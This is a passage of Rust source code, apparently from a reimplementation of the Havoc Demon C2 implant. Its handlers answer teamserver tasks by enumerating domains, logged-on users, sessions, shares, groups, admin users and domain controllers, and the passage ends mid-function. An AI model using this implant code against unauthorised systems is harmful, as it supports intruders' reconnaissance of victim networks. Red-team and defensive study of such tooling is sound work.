//! Network discovery and enumeration handlers.

#[cfg(not(windows))]
use std::process::{Command as SysCommand, Stdio};

use red_cell_common::demon::{DemonCommand, DemonNetCommand};
use tracing::{info, warn};

use super::{
    DispatchResult, Response, decode_utf16le_null, parse_bytes_le, parse_u32_le, write_bytes_le,
    write_u32_le, write_utf16le,
};

// ─── COMMAND_NET (2100) ─────────────────────────────────────────────────────

/// Handle a `CommandNet` task: dispatch to the appropriate network-discovery
/// subcommand handler.
///
/// Incoming payload (LE): `[subcommand: u32][...subcommand-specific fields]`
pub(super) fn handle_net(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandNet: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonNetCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandNet: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandNet dispatch");

    let rest = &payload[offset..];
    match subcmd {
        DemonNetCommand::Domain => handle_net_domain(),
        DemonNetCommand::Logons => handle_net_logons(rest),
        DemonNetCommand::Sessions => handle_net_sessions(rest),
        DemonNetCommand::Computer => handle_net_computer(rest),
        DemonNetCommand::DcList => handle_net_dclist(rest),
        DemonNetCommand::Share => handle_net_share(rest),
        DemonNetCommand::LocalGroup => handle_net_groups(subcmd_raw, rest),
        DemonNetCommand::Group => handle_net_groups(subcmd_raw, rest),
        DemonNetCommand::Users => handle_net_users(rest),
    }
}

/// `DEMON_NET_COMMAND_DOMAIN` (1): return the DNS domain name of the machine.
///
/// Response payload (LE): `[1: u32][domain_string: len-prefixed bytes]`
fn handle_net_domain() -> DispatchResult {
    let domain = platform_domain_name();
    info!(domain = %domain, "NetDomain");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Domain));
    // Domain uses plain ASCII/UTF-8 string (not UTF-16), matching Havoc's PackageAddString.
    write_bytes_le(&mut payload, domain.as_bytes());

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_LOGONS` (2): enumerate logged-on users.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[2: u32][server_name: UTF-16LE][username: UTF-16LE]…`
fn handle_net_logons(rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("NetLogons: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    let users = platform_logged_on_users();
    info!(server = %server, count = users.len(), "NetLogons");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Logons));
    write_utf16le(&mut payload, &server);
    for user in &users {
        write_utf16le(&mut payload, user);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_SESSIONS` (3): enumerate active sessions.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[3: u32][server_name: UTF-16LE][client: UTF-16LE][user: UTF-16LE][time: u32][idle: u32]…`
fn handle_net_sessions(rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("NetSessions: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    let sessions = platform_sessions();
    info!(server = %server, count = sessions.len(), "NetSessions");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Sessions));
    write_utf16le(&mut payload, &server);
    for session in &sessions {
        write_utf16le(&mut payload, &session.client);
        write_utf16le(&mut payload, &session.user);
        write_u32_le(&mut payload, session.active_secs);
        write_u32_le(&mut payload, session.idle_secs);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_COMPUTER` (4) / `DEMON_NET_COMMAND_DCLIST` (5): name lists.
///
/// Computer and DcList are stubs in the original Havoc Demon. We implement the
/// wire format so the teamserver can parse a valid (possibly empty) response.
///
/// `DEMON_NET_COMMAND_COMPUTER` (4): enumerate computers in the domain.
///
/// Incoming: `[domain: len-prefixed UTF-16LE]`
/// Response (LE): `[4: u32][domain: UTF-16LE][computer_name: UTF-16LE]…`
fn handle_net_computer(rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let domain_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("NetComputer: failed to parse domain: {e}");
            return DispatchResult::Ignore;
        }
    };
    let domain = decode_utf16le_null(&domain_bytes);

    let computers = platform_computers(&domain);
    info!(domain = %domain, count = computers.len(), "NetComputer");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Computer));
    write_utf16le(&mut payload, &domain);
    for name in &computers {
        write_utf16le(&mut payload, name);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_DCLIST` (5): list domain controllers.
///
/// Incoming: `[domain: len-prefixed UTF-16LE]`
/// Response (LE): `[5: u32][domain: UTF-16LE][dc_name: UTF-16LE]…`
fn handle_net_dclist(rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let domain_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("NetDcList: failed to parse domain: {e}");
            return DispatchResult::Ignore;
        }
    };
    let domain = decode_utf16le_null(&domain_bytes);

    let dcs = platform_dc_list(&domain);
    info!(domain = %domain, count = dcs.len(), "NetDcList");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::DcList));
    write_utf16le(&mut payload, &domain);
    for name in &dcs {
        write_utf16le(&mut payload, name);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_SHARE` (6): enumerate network shares.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[6: u32][server_name: UTF-16LE][name: UTF-16LE][path: UTF-16LE][remark: UTF-16LE][permissions: u32]…`
fn handle_net_share(rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("NetShare: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    let shares = platform_shares();
    info!(server = %server, count = shares.len(), "NetShare");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Share));
    write_utf16le(&mut payload, &server);
    for share in &shares {
        write_utf16le(&mut payload, &share.name);
        write_utf16le(&mut payload, &share.path);
        write_utf16le(&mut payload, &share.remark);
        write_u32_le(&mut payload, share.permissions);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_LOCALGROUP` (7) / `DEMON_NET_COMMAND_GROUP` (8): group enumeration.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[subcmd: u32][server_name: UTF-16LE][name: UTF-16LE][description: UTF-16LE]…`
fn handle_net_groups(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!(subcmd_raw, "NetGroups: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    let groups = platform_groups();
    info!(server = %server, count = groups.len(), subcmd = subcmd_raw, "NetGroups");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, subcmd_raw);
    write_utf16le(&mut payload, &server);
    for group in &groups {
        write_utf16le(&mut payload, &group.name);
        write_utf16le(&mut payload, &group.description);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_USER` (9): enumerate users on a target host.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[9: u32][server_name: UTF-16LE][username: UTF-16LE][is_admin: u32]…`
fn handle_net_users(rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("NetUsers: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    let users = platform_users();
    info!(server = %server, count = users.len(), "NetUsers");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Users));
    write_utf16le(&mut payload, &server);
    for user in &users {
        write_utf16le(&mut payload, &user.name);
        write_u32_le(&mut payload, u32::from(user.is_admin));
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

// ─── Net data structures ────────────────────────────────────────────────────

/// An active network session entry (maps to `SESSION_INFO_10` on Windows).
struct NetSession {
    client: String,
    user: String,
    active_secs: u32,
    idle_secs: u32,
}

/// A network share entry (maps to `SHARE_INFO_502` on Windows).
struct NetShare {
    name: String,
    path: String,
    remark: String,
    permissions: u32,
}

/// A group entry with name and description.
struct NetGroup {
    name: String,
    description: String,
}

/// A user entry with an admin flag.
struct NetUser {
    name: String,
    is_admin: bool,
}

// ─── Platform data collection ───────────────────────────────────────────────
//
// On Windows, Win32 Net* APIs provide host-native data.  On non-Windows
// platforms (Linux CI), /proc, /etc/passwd, /etc/group, and the `who`
// command provide equivalent data so the handler logic and wire format can
// be fully tested without a Windows target.

/// Decode a null-terminated UTF-16 string from a raw pointer.
///
/// SAFETY: `ptr` must be null or point to a valid null-terminated UTF-16 string.
#[cfg(windows)]
#[allow(unsafe_code)]
unsafe fn wstr_to_string(ptr: *const u16) -> String {
    if ptr.is_null() {
        return String::new();
    }
    let mut len = 0usize;
    while *ptr.add(len) != 0 {
        len += 1;
    }
    String::from_utf16_lossy(std::slice::from_raw_parts(ptr, len))
}

/// Return the DNS domain name of this machine via `GetComputerNameExW`.
#[cfg(windows)]
#[allow(unsafe_code)]
fn platform_domain_name() -> String {
    use windows_sys::Win32::System::SystemInformation::{
        ComputerNameDnsDomain, GetComputerNameExW,
    };
    // DNS domain names are at most 255 chars; 256 is always sufficient.
    let mut size: u32 = 256;
    let mut buf: Vec<u16> = vec![0u16; size as usize];
    // SAFETY: buf is valid with `size` capacity; size is updated to chars written (no null).
    let ok = unsafe { GetComputerNameExW(ComputerNameDnsDomain, buf.as_mut_ptr(), &mut size) };
    if ok != 0 {
        buf.truncate(size as usize);
        String::from_utf16_lossy(&buf)
    } else {
        String::new()
    }
}

/// Return the DNS domain name of this machine (Linux fallback).
#[cfg(not(windows))]
fn platform_domain_name() -> String {
    if let Ok(raw) = std::fs::read_to_string("/proc/sys/kernel/domainname") {
        let trimmed = raw.trim();
        if !trimmed.is_empty() && trimmed != "(none)" {
            return trimmed.to_string();
        }
    }
    if let Ok(output) =
        SysCommand::new("hostname").arg("-d").stdout(Stdio::piped()).stderr(Stdio::null()).output()
    {
        let domain = String::from_utf8_lossy(&output.stdout).trim().to_string();
        if !domain.is_empty() {
            return domain;
        }
    }
    String::new()
}

/// Enumerate currently logged-on users via `NetWkstaUserEnum`.
#[cfg(windows)]
#[allow(unsafe_code)]
fn platform_logged_on_users() -> Vec<String> {
    use windows_sys::Win32::Foundation::ERROR_MORE_DATA;
    use windows_sys::Win32::NetworkManagement::NetManagement::{
        NetApiBufferFree, NetWkstaUserEnum, WKSTA_USER_INFO_1,
    };
    let mut users: Vec<String> = Vec::new();
    let mut resume_handle: u32 = 0;
    loop {
        let mut buf: *mut u8 = std::ptr::null_mut();
        let mut entries_read: u32 = 0;
        let mut total_entries: u32 = 0;
        // SAFETY: all pointers valid; buf freed with NetApiBufferFree after use.
        let status = unsafe {
            NetWkstaUserEnum(
                std::ptr::null(),
                1,
                &mut buf,
                u32::MAX,
                &mut entries_read,
                &mut total_entries,
                &mut resume_handle,
            )
        };
        if !buf.is_null() && entries_read > 0 {
            // SAFETY: buf points to `entries_read` WKSTA_USER_INFO_1 structs.
            let entries = unsafe {
                std::slice::from_raw_parts(buf as *const WKSTA_USER_INFO_1, entries_read as usize)
            };
            for entry in entries {
                // SAFETY: wkui1_username is a valid null-terminated UTF-16 string.
                let name = unsafe { wstr_to_string(entry.wkui1_username as *const u16) };
                if !name.is_empty() && !users.contains(&name) {
                    users.push(name);
                }
            }
        }
        if !buf.is_null() {
            // SAFETY: buf was allocated by NetWkstaUserEnum.
            unsafe { NetApiBufferFree(buf as *mut _) };
        }
        if status != ERROR_MORE_DATA {
            break;
        }
    }
    users
}

/// Enumerate currently logged-on users via `who` (Linux fallback).
#[cfg(not(windows))]
fn platform_logged_on_users() -> Vec<String> {
    let mut users = Vec::new();
    if let Ok(output) = SysCommand::new("who").stdout(Stdio::piped()).stderr(Stdio::null()).output()
    {
        let text = String::from_utf8_lossy(&output.stdout);
        for line in text.lines() {
            if let Some(name) = line.split_whitespace().next() {
                if !users.contains(&name.to_string()) {
                    users.push(name.to_string());
                }
            }
        }
    }
    users
}

/// Enumerate active login sessions via `NetSessionEnum`.
#[cfg(windows)]
#[allow(unsafe_code)]
fn platform_sessions() -> Vec<NetSession> {
    use windows_sys::Win32::Foundation::ERROR_MORE_DATA;
    use windows_sys::Win32::NetworkManagement::NetManagement::NetApiBufferFree;
    use windows_sys::Win32::Storage::FileSystem::{NetSessionEnum, SESSION_INFO_10};
    let mut sessions: Vec<NetSession> = Vec::new();
    let mut resume_handle: u32 = 0;
    loop {
        let mut buf: *mut u8 = std::ptr::null_mut();
        let mut entries_read: u32 = 0;
        let mut total_entries: u32 = 0;
        // SAFETY: all pointers valid; buf freed with NetApiBufferFree after use.
        let status = unsafe {
            NetSessionEnum(
                std::ptr::null(),
                std::ptr::null(),
                std::ptr::null(),
                10,
                &mut buf,
                u32::MAX,
                &mut entries_read,
                &mut total_entries,
                &mut resume_handle,
            )
        };
        if !buf.is_null() && entries_read > 0 {
            // SAFETY: buf points to `entries_read` SESSION_INFO_10 structs.
            let entries = unsafe {
                std::slice::from_raw_parts(buf as *const SESSION_INFO_10, entries_read as usize)
            };
            for entry in entries {
                // SAFETY: string fields are valid null-terminated UTF-16 strings.
                sessions.push(NetSession {
                    client: unsafe { wstr_to_string(entry.sesi10_cname as *const u16) },
                    user: unsafe { wstr_to_string(entry.sesi10_username as *const u16) },
                    active_secs: entry.sesi10_time,
                    idle_secs: entry.sesi10_idle_time,
                });
            }
        }
        if !buf.is_null() {
            // SAFETY: buf was allocated by NetSessionEnum.
            unsafe { NetApiBufferFree(buf as *mut _) };
        }
        if status != ERROR_MORE_DATA {
            break;
        }
    }
    sessions
}

/// Enumerate active login sessions via `who` (Linux fallback).
#[cfg(not(windows))]
fn platform_sessions() -> Vec<NetSession> {
    let mut sessions = Vec::new();
    if let Ok(output) = SysCommand::new("who").stdout(Stdio::piped()).stderr(Stdio::null()).output()
    {
        let text = String::from_utf8_lossy(&output.stdout);
        for line in text.lines() {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                sessions.push(NetSession {
                    client: parts.get(1).unwrap_or(&"").to_string(),
                    user: parts.first().unwrap_or(&"").to_string(),
                    active_secs: 0,
                    idle_secs: 0,
                });
            }
        }
    }
    sessions
}

/// Enumerate network shares via `NetShareEnum`.
///
/// Attempts level 2 (`SHARE_INFO_2`, admin-only) to obtain path and permissions.
/// On the first `ERROR_ACCESS_DENIED` at level 2, resets and retries at level 1
/// (`SHARE_INFO_1`), leaving `path` empty and `permissions` zero.
///
/// The fallback is driven directly by the loop rather than a throw-away probe call,
/// which avoids a race between the API's buffer-size check and its access check.
#[cfg(windows)]
#[allow(unsafe_code)]
fn platform_shares() -> Vec<NetShare> {
    use windows_sys::Win32::Foundation::{ERROR_ACCESS_DENIED, ERROR_MORE_DATA};
    use windows_sys::Win32::NetworkManagement::NetManagement::NetApiBufferFree;
    use windows_sys::Win32::Storage::FileSystem::{NetShareEnum, SHARE_INFO_1, SHARE_INFO_2};

    let mut shares: Vec<NetShare> = Vec::new();
    let mut level: u32 = 2;
    let mut resume_handle: u32 = 0;
    loop {
        let mut buf: *mut u8 = std::ptr::null_mut();
        let mut entries_read: u32 = 0;
        let mut total_entries: u32 = 0;
        // SAFETY: all pointers valid; buf freed with NetApiBufferFree after use.
        let status = unsafe {
            NetShareEnum(
                std::ptr::null(),
                level,
                &mut buf,
                u32::MAX,
                &mut entries_read,
                &mut total_entries,
                &mut resume_handle,
            )
        };
        // Non-admin callers get ERROR_ACCESS_DENIED on the first level-2 attempt.
        // Fall back to level 1 immediately rather than returning an empty Vec.
        if status == ERROR_ACCESS_DENIED && level == 2 {
            if !buf.is_null() {
                // SAFETY: buf was allocated by NetShareEnum.
                unsafe { NetApiBufferFree(buf as *mut _) };
            }
            shares.clear();
            level = 1;
            resume_handle = 0;
            continue;
        }
        if !buf.is_null() && entries_read > 0 {
            if level == 2 {
                // SAFETY: buf points to `entries_read` SHARE_INFO_2 structs.
                let entries = unsafe {
                    std::slice::from_raw_parts(buf as *const SHARE_INFO_2, entries_read as usize)
                };
                for entry in entries {
                    // SAFETY: string fields are valid null-terminated UTF-16 strings.
                    shares.push(NetShare {
                        name: unsafe { wstr_to_string(entry.shi2_netname as *const u16) },
                        path: unsafe { wstr_to_string(entry.shi2_path as *const u16) },
                        remark: unsafe { wstr_to_string(entry.shi2_remark as *const u16) },
                        permissions: entry.shi2_permissions,
                    });
                }
            } else {
                // SAFETY: buf points to `entries_read` SHARE_INFO_1 structs.
                let entries = unsafe {
                    std::slice::from_raw_parts(buf as *const SHARE_INFO_1, entries_read as usize)
                };
                for entry in entries {
                    // SAFETY: string fields are valid null-terminated UTF-16 strings.
                    shares.push(NetShare {
                        name: unsafe { wstr_to_string(entry.shi1_netname as *const u16) },
                        path: String::new(),
                        remark: unsafe { wstr_to_string(entry.shi1_remark as *const u16) },
                        permissions: 0,
                    });
                }
            }
        }
        if !buf.is_null() {
            // SAFETY: buf was allocated by NetShareEnum.
            unsafe { NetApiBufferFree(buf as *mut _) };
        }
        if status != ERROR_MORE_DATA {
            break;
        }
    }
    shares
}

/// Enumerate network shares (Linux: no Samba equivalent, returns empty list).
#[cfg(not(windows))]
fn platform_shares() -> Vec<NetShare> {
    Vec::new()
}

/// Enumerate local groups via `NetLocalGroupEnum`.
#[cfg(windows)]
#[allow(unsafe_code)]
fn platform_groups() -> Vec<NetGroup> {
    use windows_sys::Win32::Foundation::ERROR_MORE_DATA;
    use windows_sys::Win32::NetworkManagement::NetManagement::{
        LOCALGROUP_INFO_1, NetApiBufferFree, NetLocalGroupEnum,
    };
    let mut groups: Vec<NetGroup> = Vec::new();
    let mut resume_handle: usize = 0;
    loop {
        let mut buf: *mut u8 = std::ptr::null_mut();
        let mut entries_read: u32 = 0;
        let mut total_entries: u32 = 0;
        // SAFETY: all pointers valid; buf freed with NetApiBufferFree after use.
        let status = unsafe {
            NetLocalGroupEnum(
                std::ptr::null(),
                1,
                &mut buf,
                u32::MAX,
                &mut entries_read,
                &mut total_entries,
                &mut resume_handle,
            )
        };
        if !buf.is_null() && entries_read > 0 {
            // SAFETY: buf points to `entries_read` LOCALGROUP_INFO_1 structs.
            let entries = unsafe {
                std::slice::from_raw_parts(buf as *const LOCALGROUP_INFO_1, entries_read as usize)
            };
            for entry in entries {
                // SAFETY: string fields are valid null-terminated UTF-16 strings.
                groups.push(NetGroup {
                    name: unsafe { wstr_to_string(entry.lgrpi1_name as *const u16) },
                    description: unsafe { wstr_to_string(entry.lgrpi1_comment as *const u16) },
                });
            }
        }
        if !buf.is_null() {
            // SAFETY: buf was allocated by NetLocalGroupEnum.
            unsafe { NetApiBufferFree(buf as *mut _) };
        }
        if status != ERROR_MORE_DATA {
            break;
        }
    }
    groups
}

/// Enumerate local groups from `/etc/group` (Linux fallback).
#[cfg(not(windows))]
fn platform_groups() -> Vec<NetGroup> {
    let mut groups = Vec::new();
    if let Ok(content) = std::fs::read_to_string("/etc/group") {
        for line in content.lines() {
            if line.starts_with('#') || line.is_empty() {
                continue;
            }
            let parts: Vec<&str> = line.splitn(4, ':').collect();
            if let Some(name) = parts.first() {
                groups.push(NetGroup { name: (*name).to_string(), description: String::new() });
            }
        }
    }
    groups
}

/// Resolve the localized name of the built-in Administrators group (S-1-5-32-544) as a
/// NUL-terminated UTF-16 string suitable for passing to `NetLocalGroupGetMembers`.
///
/// Using a SID lookup instead of the literal `"Administrators"` makes this work on
/// non-English Windows installations where the group name is translated.
#[cfg(windows)]
#[allow(unsafe_code)]
fn builtin_administrators_name_w() -> Option<Vec<u16>> {
    use windows_sys::Win32::Foundation::FALSE;
    use windows_sys::Win32::Security::{
        CreateWellKnownSid, LookupAccountSidW, SID_NAME_USE, WinBuiltinAdministratorsSid,
    };

    // Phase 1: query the byte size required for the Administrators SID.
    // CreateWellKnownSid returns FALSE when psid is NULL but still sets cbsid.
    let mut sid_size: u32 = 0;
    // SAFETY: pSid is NULL intentionally; Windows fills cbSid with the required size on first call.
    unsafe {
        CreateWellKnownSid(
            WinBuiltinAdministratorsSid,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut sid_size,
        );
    }
    if sid_size == 0 {
        return None;
    }

    // Phase 2: allocate and populate the SID buffer.
    let mut sid_buf = vec![0u8; sid_size as usize];
    // SAFETY: sid_buf is correctly sized per Phase 1; pDomainSid is NULL because well-known SIDs need no domain.
    let ok = unsafe {
        CreateWellKnownSid(
            WinBuiltinAdministratorsSid,
            std::ptr::null_mut(),
            sid_buf.as_mut_ptr() as *mut core::ffi::c_void,
            &mut sid_size,
        )
    };
    if ok == FALSE {
        return None;
    }

    // Phase 3: first LookupAccountSidW call to get required buffer sizes.
    let sid_ptr = sid_buf.as_ptr() as *mut core::ffi::c_void;
    let mut name_len: u32 = 0;
    let mut domain_len: u32 = 0;
    let mut sid_type: SID_NAME_USE = 0;
    // SAFETY: both name and domain buffers are NULL intentionally; Windows fills the length fields with required sizes.
    unsafe {
        LookupAccountSidW(
            std::ptr::null(),
            sid_ptr,
            std::ptr::null_mut(),
            &mut name_len,
            std::ptr::null_mut(),
            &mut domain_len,
            &mut sid_type,
        );
    }
    if name_len == 0 {
        return None;
    }

    // Phase 4: allocate buffers and retrieve the localized group name.
    // name_len from the first call includes the NUL terminator.
    let mut name_buf = vec![0u16; name_len as usize];
    let mut domain_buf = vec![0u16; domain_len.max(1) as usize];
    // SAFETY: name_buf and domain_buf are correctly sized per Phase 3; sid_ptr remains valid for the lifetime of sid_buf.
    let ok = unsafe {
        LookupAccountSidW(
            std::ptr::null(),
            sid_ptr,
            name_buf.as_mut_ptr(),
            &mut name_len,
            domain_buf.as_mut_ptr(),
            &mut domain_len,
            &mut sid_type,
        )
    };
    if ok == FALSE {
        return None;
    }
    // name_len now excludes the NUL; name_buf[name_len] is 0 (pre-initialized).
    Some(name_buf)
}

/// Collect the lowercase usernames of every member of the built-in local Administrators group.
/// The group is identified by its well-known SID (S-1-5-32-544) so this works on
/// non-English Windows installations where the group display name is translated.
#[cfg(windows)]
#[allow(unsafe_code)]
fn administrators_group_members() -> std::collections::HashSet<String> {
    use windows_sys::Win32::Foundation::ERROR_MORE_DATA;
    use windows_sys::Win32::NetworkManagement::NetManagement::{
        LOCALGROUP_MEMBERS_INFO_3, NetApiBufferFree, NetLocalGroupGetMembers,
    };
    let group_w = match builtin_administrators_name_w() {
        Some(name) => name,
        None => {
            warn!(
                "administrators_group_members: could not resolve built-in Administrators SID — is_admin may be incomplete"
            );
            return std::collections::HashSet::new();
        }
    };
    let mut members: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut resume_handle: usize = 0;
    loop {
        let mut buf: *mut u8 = std::ptr::null_mut();
        let mut entries_read: u32 = 0;
        let mut total_entries: u32 = 0;
        // SAFETY: all pointers valid; buf freed with NetApiBufferFree after use.
        let status = unsafe {
            NetLocalGroupGetMembers(
                std::ptr::null(),
                group_w.as_ptr(),
                3,
                &mut buf,
                u32::MAX,
                &mut entries_read,
                &mut total_entries,
                &mut resume_handle,
            )
        };
        if !buf.is_null() && entries_read > 0 {
            // SAFETY: buf points to `entries_read` LOCALGROUP_MEMBERS_INFO_3 structs.
            let entries = unsafe {
                std::slice::from_raw_parts(
                    buf as *const LOCALGROUP_MEMBERS_INFO_3,
                    entries_read as usize,
                )
            };
            for entry in entries {
                // SAFETY: lgrmi3_domainandname is a valid null-terminated UTF-16 string.
                let full = unsafe { wstr_to_string(entry.lgrmi3_domainandname as *const u16) };
                // Strip the optional "DOMAIN\" prefix; keep only the account name.
                let name = full.rsplit('\\').next().unwrap_or(&full).to_ascii_lowercase();
                if !name.is_empty() {
                    members.insert(name);
                }
            }
        }
        if !buf.is_null() {
            // SAFETY: buf was allocated by NetLocalGroupGetMembers.
            unsafe { NetApiBufferFree(buf as *mut _) };
        }
        if status != 0 && status != ERROR_MORE_DATA {
            warn!(
                status,
                "administrators_group_members: NetLocalGroupGetMembers failed — is_admin may be incomplete"
            );
            break;
        }
        if status != ERROR_MORE_DATA {
            break;
        }
    }
    members
}

/// Enumerate local users via `NetUserEnum`; sets `is_admin` via privilege level or Administrators group membership.
#[cfg(windows)]
#[allow(unsafe_code)]
fn platform_users() -> Vec<NetUser> {
    use windows_sys::Win32::Foundation::ERROR_MORE_DATA;
    use windows_sys::Win32::NetworkManagement::NetManagement::{
        FILTER_NORMAL_ACCOUNT, NetApiBufferFree, NetUserEnum, USER_INFO_1, USER_PRIV_ADMIN,
    };
    let admin_members = administrators_group_members();
    let mut users: Vec<NetUser> = Vec::new();
    let mut resume_handle: u32 = 0;
    loop {
        let mut buf: *mut u8 = std::ptr::null_mut();
        let mut entries_read: u32 = 0;
        let mut total_entries: u32 = 0;
        // SAFETY: all pointers valid; buf freed with NetApiBufferFree after use.
        let status = unsafe {
            NetUserEnum(
                std::ptr::null(),
                1,
                FILTER_NORMAL_ACCOUNT,
                &mut buf,
                u32::MAX,
                &mut entries_read,
                &mut total_entries,
                &mut resume_handle,
            )
        };
        if !buf.is_null() && entries_read > 0 {
            // SAFETY: buf points to `entries_read` USER_INFO_1 structs.
            let entries = unsafe {
                std::slice::from_raw_parts(buf as *const USER_INFO_1, entries_read as usize)
            };
            for entry in entries {
                // SAFETY: usri1_name is a valid null-terminated UTF-16 string.
                let name = unsafe { wstr_to_string(entry.usri1_name as *const u16) };
                let in_admin_group = admin_members.contains(&name.to_ascii_lowercase());
                users.push(NetUser {
                    is_admin: entry.usri1_priv == USER_PRIV_ADMIN || in_admin_group,
                    name,
                });
            }
        }
        if !buf.is_null() {
            // SAFETY: buf was allocated by NetUserEnum.
            unsafe { NetApiBufferFree(buf as *mut _) };
        }
        if status != ERROR_MORE_DATA {
            break;
        }
    }
    users
}

/// Enumerate local users from `/etc/passwd` (Linux fallback).
#[cfg(not(windows))]
fn platform_users() -> Vec<NetUser> {
    let mut users = Vec::new();
    if let Ok(content) = std::fs::read_to_string("/etc/passwd") {
        for line in content.lines() {
            if line.starts_with('#') || line.is_empty() {
                continue;
            }
            let parts: Vec<&str> = line.splitn(4, ':').collect();
            if let Some(name) = parts.first() {
                // UID 0 = root = admin equivalent on Linux.
                let uid: u32 = parts.get(2).and_then(|s| s.parse().ok()).unwrap_or(u32::MAX);
                users.push(NetUser { name: (*name).to_string(), is_admin: uid == 0 });
            }
        }
    }
    users
}

/// Enumerate computers in `domain` using `NetServerEnum`.
///
/// On Windows calls `NetServerEnum` with `SV_TYPE_ALL` scoped to the given
/// domain.  On non-Windows returns an empty list (no equivalent API).
fn platform_computers(domain: &str) -> Vec<String> {
    #[cfg(windows)]
    {
        platform_servers_by_type(
            domain,
            windows_sys::Win32::NetworkManagement::NetManagement::SV_TYPE_ALL,
        )
    }
    #[cfg(not(windows))]
    {
        let _ = domain;
        Vec::new()
    }
}

/// Enumerate domain controllers in `domain` using `NetServerEnum`.
///
/// On Windows calls `NetServerEnum` filtering to DC and backup-DC server
/// types.  On non-Windows returns an empty list (no equivalent API).
fn platform_dc_list(domain: &str) -> Vec<String> {
    #[cfg(windows)]
    {
        use windows_sys::Win32::NetworkManagement::NetManagement::{
            SV_TYPE_DOMAIN_BAKCTRL, SV_TYPE_DOMAIN_CTRL,
        };
        platform_servers_by_type(domain, SV_TYPE_DOMAIN_CTRL | SV_TYPE_DOMAIN_BAKCTRL)
    }
    #[cfg(not(windows))]
    {
        let _ = domain;
        Vec::new()
    }
}

/// Shared helper: call `NetServerEnum` with the given `server_type` mask
/// against `domain` and return the list of server names.
#[cfg(windows)]
#[allow(unsafe_code)]
fn platform_servers_by_type(domain: &str, server_type: u32) -> Vec<String> {
    use windows_sys::Win32::Foundation::ERROR_MORE_DATA;
    use windows_sys::Win32::NetworkManagement::NetManagement::{
        NetApiBufferFree, NetServerEnum, SERVER_INFO_101,
    };

    // Encode domain as null-terminated UTF-16.
    let domain_w: Vec<u16> = domain.encode_utf16().chain(std::iter::once(0)).collect();
    let domain_ptr = if domain.is_empty() { std::ptr::null() } else { domain_w.as_ptr() };

    let mut names = Vec::new();
    let mut resume_handle: u32 = 0;

    loop {
        let mut buf: *mut u8 = std::ptr::null_mut();
        let mut entries_read: u32 = 0;
        let mut total_entries: u32 = 0;

        // SAFETY: All pointers are valid; `buf` is written by the API and
        // must be freed with `NetApiBufferFree`.
        let status = unsafe {
            NetServerEnum(
                std::ptr::null(), // local machine as server
                101,              // SERVER_INFO_101
                &mut buf,
